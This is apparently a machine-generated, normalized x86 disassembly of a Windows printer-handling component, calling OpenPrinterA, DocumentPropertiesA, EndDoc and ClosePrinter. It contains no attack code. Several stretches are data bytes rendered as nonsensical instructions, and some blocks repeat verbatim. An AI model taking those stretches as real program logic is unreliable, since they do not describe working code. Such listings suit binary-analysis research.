mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_427c90
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_428fac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_429091
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429098
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
lea eax [ ebp - 0x8 ]
call sub_405928
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_427c90
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405940
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_427c90
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405940
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4292c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4293bb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40408c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293c2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
lea eax [ ebp - 0x10 ]
call sub_405928
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_427c90
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405940
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_4293e0
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4294bf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40408c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4294c6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
lea eax [ ebp - 0x8 ]
call sub_405928
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_427c90
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405940
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40596c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4294e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40599c
xor eax eax
push ebp
push sub_42952f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429536
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebx + 0xc ]
call sub_405928
sub_42953c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4295d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40408c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4292c8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4295d8
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_428ddc
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_428e0c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428fac
sub_4295fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_427c90
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_427c90
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_417460
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_427c90
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_417460
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_417460
sub_429688
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_428d9c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4032e8
mov eax [ esi + 0x14 ]
call sub_4032e8
mov eax [ esi + 0x10 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405928
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4296dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429713
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42971a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_429744
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429769
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429770
retn
sub_429780
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4297 0x0
or al 0x0
add [ eax ] al
pop eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
cwde
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x65d7ffc0 ] bl
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] cl
inc ebp
push eax
jb r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
outsb
je r-xdata
cmp [ edx ] 0x20
je r-xdata
jb r-xdata
jb r-xdata
inc edx
mov esi edx
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
neg [ eax + 0x100042 ]
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
outsb
je r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_429770
retn
inc eax
mov cl [ edx ]
test cl cl
je r-xdata
retn 0x8
outsb
je r-xdata
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
cwde
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
jb r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
pop ebp
jb r-xdata
add [ eax ] ah
cwde
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cwde
inc edx
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x408d7265
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
call sub_404230
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4299db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404230
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404444
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404230
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404230
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_40360c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4299e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404444
je r-xdata
sub_42983c
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42988c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x98
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
cwde
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
retn 0x8
outsb
je r-xdata
pop ebp
jb r-xdata
call sub_404230
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4299db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404230
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404444
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404230
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404230
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_40360c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4299e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404444
je r-xdata
sub_429908
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404230
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404230
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_429968
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4299db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404230
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404444
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4299e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404444
je r-xdata
sub_4299ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_429a28
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_429aa4
mov eax esi
call sub_42a4ac
mov eax esi
call sub_42a4e8
mov eax [ esi + 0x4 ]
call sub_4032e8
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_429c40
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_429aa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_429bc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429bc9
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_429bd0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_4214ec
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42a054
push eax
mov eax esi
call sub_42a06c
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4044f8
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_4214ec
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x8 ]
call sub_429870
mov edi r-xdata
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_4214ec
sub_429bd0
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_429c35
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c3c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x8 ]
call sub_429870
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_429870
jmp r-xdata
sub_429c40
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_429bd0
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_429c74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42a054
push eax
mov eax ebx
call sub_42a06c
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4044f8
mov edx eax
mov eax edi
call sub_408860
mov eax [ esi + 0x4 ]
call sub_4044f8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_408860
mov eax [ esi + 0xc ]
call sub_4044f8
mov edx eax
mov eax [ ebp + 0xc ]
call sub_408860
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_429ce0
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_429d1c
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_429f53
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_429bd0
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42a4e8
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_429ce0
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_429aa4
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42a06c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429908
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408f18
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_404230
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f5a
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_40405c
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_429968
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_429ce0
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_429f78
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_429fcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42a054
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
movsx eax [ eax + 0x36 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fd6
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_429870
sub_429fdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a046
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_429bd0
mov eax ebx
call sub_42a054
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
